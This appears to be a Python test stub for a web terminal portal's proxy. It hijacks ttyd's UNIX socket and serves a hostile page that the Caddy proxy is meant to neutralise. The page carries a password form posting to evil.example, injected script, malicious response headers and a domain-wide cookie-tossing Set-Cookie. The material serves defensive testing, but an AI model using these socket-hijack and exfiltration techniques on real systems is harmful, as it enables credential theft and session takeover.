"""A stand-in for ttyd on its UNIX socket — what any code in the terminal's sandbox could start (run.sh copies this
into the terminal container for browser/terminal-hostile-upstream@hostile). It moves ttyd's socket aside (ttyd keeps
listening on it, as ttyd.real), takes its path, and puts it back when it gets SIGTERM. Every page carries an inline
script, a form posting elsewhere, and the response headers the main Caddy must take away (caddy/Caddyfile,
terminal_page). Usage: python3 terminal-stub.py SOCKET"""

import http.server
import os
import signal
import socketserver
import sys

SOCK = sys.argv[1]
REAL = os.path.join(os.path.dirname(SOCK), "ttyd.real")

PAGE = (b'<!doctype html><html><head><meta charset="utf-8"><title>stand-in</title></head><body>'
        b'<h1 id="stub">a stand-in on ttyd\'s socket</h1>'
        b'<form id="steal" method="post" action="http://evil.example/steal"><input name="password" value="x"></form>'
        b'<script>window.pwned = 1; document.title = "pwned";</script></body></html>')
HEADERS = [
    ("Content-Security-Policy", "script-src 'unsafe-inline'"),
    ("Set-Cookie", "bn_stub=1; Path=/"),
    ("Clear-Site-Data", '"cookies", "storage"'),
    ("Refresh", "30; url=http://evil.example/"),
    ("Link", "<http://evil.example/x.js>; rel=preload; as=script"),
    ("Service-Worker-Allowed", "/"),
    ("Access-Control-Allow-Origin", "http://evil.example"),
    ("Access-Control-Allow-Credentials", "true"),
    ("Report-To", '{"group":"x","max_age":60,"endpoints":[{"url":"http://evil.example/r"}]}'),
]


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        for k, v in HEADERS:
            self.send_header(k, v)
        # and one for the portal's whole domain (terminal.<host> → <host>): cookie tossing
        parent = (self.headers.get("Host") or "x").split(":")[0].split(".", 1)[-1]
        self.send_header("Set-Cookie", f"bn_stub_wide=1; Path=/; Domain={parent}")
        self.send_header("Content-Length", str(len(PAGE)))
        self.end_headers()
        self.wfile.write(PAGE)

    def log_message(self, *args):
        pass

    def address_string(self):
        return "stub"


class Server(socketserver.ThreadingMixIn, socketserver.UnixStreamServer):
    daemon_threads = True


def restore(*_):
    os.replace(REAL, SOCK)   # ttyd's own socket back at its path, over this one
    os._exit(0)


os.rename(SOCK, REAL)
server = Server(SOCK, Handler)
signal.signal(signal.SIGTERM, restore)
server.serve_forever()
